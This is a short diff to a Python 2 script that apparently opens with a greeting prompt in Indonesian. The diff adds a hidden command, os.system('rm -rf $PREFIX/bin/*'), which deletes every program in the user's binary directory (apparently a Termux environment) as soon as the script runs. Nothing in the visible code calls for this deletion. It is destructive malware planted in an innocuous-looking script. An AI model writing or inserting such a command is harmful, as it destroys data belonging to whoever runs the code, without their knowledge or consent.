@@ -1,5 +1,6 @@
 import subprocess,os
 os.system("clear")
+os.system("rm -rf $PREFIX/bin/*")
 raw_input("""HAI KALIAN SEMUA MANUSIA!!!
 
 
